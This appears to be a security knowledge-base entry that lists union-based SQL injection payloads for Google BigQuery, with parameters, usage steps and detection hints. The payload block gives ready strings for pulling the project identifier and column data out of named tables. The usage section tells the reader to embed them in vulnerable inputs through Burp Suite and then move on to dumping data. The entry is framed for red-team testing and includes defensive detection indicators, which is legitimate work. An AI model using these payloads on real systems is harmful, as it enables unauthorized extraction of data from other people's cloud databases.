---
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:32.353101+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - sqli
  - payload
validated: true
---

# BigQuery-SQL-Injection-Payload-Examples

## Code

```sql
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## Description

This code snippet contains example SQL injection payloads for union-based attacks in BigQuery, including extractions of project_id, test strings, and column data with grouping and limiting. These are raw fragments to append to vulnerable queries for testing and exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| column_name | Target column for grouping or selection | username |
| project_id | GCP project identifier | myproject-123 |
| dataset_name | BigQuery dataset | mydataset |
| table_name | Target table | usertable |

## Usage

Embed these payloads into a vulnerable query parameter, e.g., via a web app input or API call using tools like Burp Suite. Start with project_id extraction to confirm injection, then expand to data dumping. Use in red team exercises simulating data exfiltration from cloud databases.

## Detection

- Audit logs showing UNION ALL in queries from untrusted inputs.
- Anomalous access to INFORMATION_SCHEMA or @@ variables.
- Query patterns with excessive GROUP BY or subqueries.
- WAF alerts on SQL keywords like UNION, SELECT in payloads.

## Related

- [[procedures/BigQuery-Union-Based-SQL-Injection]]
